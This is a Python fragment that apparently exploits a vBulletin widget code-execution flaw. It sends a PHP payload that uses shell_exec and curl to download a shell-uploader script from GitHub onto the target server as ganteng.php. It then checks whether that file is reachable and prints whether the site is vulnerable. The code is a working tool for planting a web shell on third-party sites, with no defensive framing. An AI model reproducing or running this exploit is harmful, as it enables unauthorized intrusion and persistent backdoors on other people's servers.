...
def vbulet(site):
	...
	try:
		cmd = 'uname -a'
		params["widgetConfig[code]"] = "echo shell_exec('curl https://raw.githubusercontent.com/Avinash-acid/Shell-Uploader/master/uploader.php -o ganteng.php'); exit;"
		r = requests.post(url, data = params, timeout=3).text
		kot = url+'/ganteng.php'
		bla = requests.get(url+'/ganteng.php').text
		if 'Avinash Kumar Thapa' in bla:
			print ('{}[ {}VULN {}] {}{} --> {}' . format(fr,fg,fr,fg,url,kot))
		else:
			print('{}[ {}NOT VULN {}] {}{} ' . format(fg,fr,fg,fg,url))
	except KeyboardInterrupt:
		sys.exit("\nClosing shell...")
	except Exception as e:
		print('{}[ {}ERROR {}]{}{} --> {}' .format(fg,fr,fg,fg,url,e))
